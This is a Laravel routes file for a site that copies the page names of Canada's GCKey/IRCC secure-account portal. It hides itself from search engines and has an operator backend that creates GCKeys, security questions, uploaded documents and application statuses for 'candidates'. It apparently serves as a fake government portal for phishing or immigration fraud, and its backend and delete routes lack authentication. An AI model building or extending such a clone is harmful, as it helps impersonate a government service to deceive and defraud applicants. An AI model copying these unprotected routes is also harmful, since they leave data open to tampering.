<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\GcKeyAuthController;
use App\Http\Controllers\BackendAuthController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;


Route::middleware(['web'])->group(function () {
Route::get('/', function () {
   return redirect()->route('gckeys-IRCC');
});

Route::get('/robots.txt', function () {
    return response("User-agent: *\nDisallow: /", 200)
           ->header('Content-Type', 'text/plain');
});

Auth::routes();

Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');
// End


// GCkey
Route::get('/gckeys-IRCC', function () {
    return view('GCKEYS.Register_for_an_IRCC_secure_account_Canada');
})->name('gckeys-IRCC');

Route::get('/gckeys-definitions', function () {
    return view('GCKEYS.GCKey_Definitions');
});

Route::get('/gckeys-faqs', function () {
    return view('GCKEYS.GCKey_Frequently_Asked_Questions');
});

Route::get('/gckeys-help', function () {
    return view('GCKEYS.GCKey_Help');
});

Route::get('/gckeys-recover-username', function () {
    return view('GCKEYS.GCKey_Recover_Username');
});

Route::get('/gckeys-sign-in', function () {
    return view('GCKEYS.GCKey_Sign_In');
});

Route::get('/gckeys-sign-up', function () {
    return view('GCKEYS.GCKey_Sign_Up');
});

Route::get('/gckeys-forgot-password', function () {
    return view('GCKEYS.GCKey_Forgot_Your_Password');
});

Route::post('/gckey-login', [GcKeyAuthController::class, 'login'])->name('gckey.login');
Route::post('/gckey-verify-question', [GcKeyAuthController::class, 'verifySecurityAnswer'])->name('verify.security.answer');
Route::get('/gckey-verify-question', [GcKeyAuthController::class, 'showSecurityQuestionForm'])->name('verify.question');
Route::get('/gckey-main', [GcKeyAuthController::class, 'mainPage'])->name('main.page');
Route::get('/gckey-terms', [GcKeyAuthController::class, 'termsconditions'])->name('terms');
Route::get('/gckey-agree-terms', [GcKeyAuthController::class, 'agreetermsconditions'])->name('agree.terms');
// Route::get('/gckey-disagree-terms', [GcKeyAuthController::class, 'disagreetermsconditions'])->name('disagree.terms');
Route::get('/application-profile/{id}', [GcKeyAuthController::class, 'applicationprofile'])->name('application.profile');



Route::get('/application-help', function () {
    return view('GCKEYS.account_help_account');
});

Route::get('/application-account-profile', function () {
    return view('GCKEYS.Account_profile');
});




Route::post('/gckey-logout', function () {
    Auth::logout();
    Session::flush();
    request()->session()->invalidate();
    request()->session()->regenerateToken();
    return redirect('/gckeys-IRCC');
})->name('logout.gcc');

// End GC KEY


  
  
Route::get('/backend.gcckeyslist', [BackendAuthController::class, 'gckeysapplicationlist'])->name('backend.gcckeyslist');
Route::get('/backend.gcckeysuserslist', [BackendAuthController::class, 'gcckeyuserlist'])->name('backend.gcckeysuserlist');



Route::post('/backend-login', [BackendAuthController::class, 'login'])->name('backend.login');
Route::get('/login-backend', function () { return view('backend.login'); });

Route::post('/backend-logout', [BackendAuthController::class, 'logout'])->name('backend.logout');


Route::get('/backend.addnewcandidate', function () {
    return view('backend.addnewcandidate');
})->name('backend.addnewcandidate');

Route::post('/backend-addcandidate', [BackendAuthController::class, 'addcandidate'])->name('backend.addcandidate');


Route::get('/backend-add-security-questions/{userid}', [BackendAuthController::class, 'addsecurityquestions']);
Route::post('/backend-post-security-questions', [BackendAuthController::class, 'postsecurityquestions'])->name('backend.postsecurityquestions');


Route::get('/backend-edit-security-question/{userid}', [BackendAuthController::class, 'editsecurityquestion']);
Route::post('/backend-edit-security-questions', [BackendAuthController::class, 'editsecurityquestions'])->name('backend.editsecurityquestions');



Route::get('/backend-create-cgkey/{userid}', [BackendAuthController::class, 'creategckey']);
Route::post('/backend-new-gckey', [BackendAuthController::class, 'newcgkey'])->name('backend.newgckey');

Route::get('/backend-edited-cgkey/{applicationid}', [BackendAuthController::class, 'editedgckey']);
Route::post('/backend-edit-gckey', [BackendAuthController::class, 'editcgkey'])->name('backend.editgckey');


Route::post('/backend-upload-docs-position', [BackendAuthController::class, 'updateposition'])->name('backend.upload.docs.position');
Route::get('/backend-upload-docs/{applicationid}', [BackendAuthController::class, 'uploaddocs']);
Route::post('/backend-postdocument', [BackendAuthController::class, 'postdocument'])->name('backend.postdocument');
// routes/web.php
Route::get('/backend-document-delete/{applicationid}/{delid}', [BackendAuthController::class, 'deleteDocument'])->name('backend.document.delete');


Route::post('/backend-application-update', [BackendAuthController::class, 'applicationupdatestatus'])->name('application.update.status');


Route::get('/backend-delete-gckey/{applicationid}/{userid}', [BackendAuthController::class, 'deletegckey'])->name('application.delete.gckey');

  
});
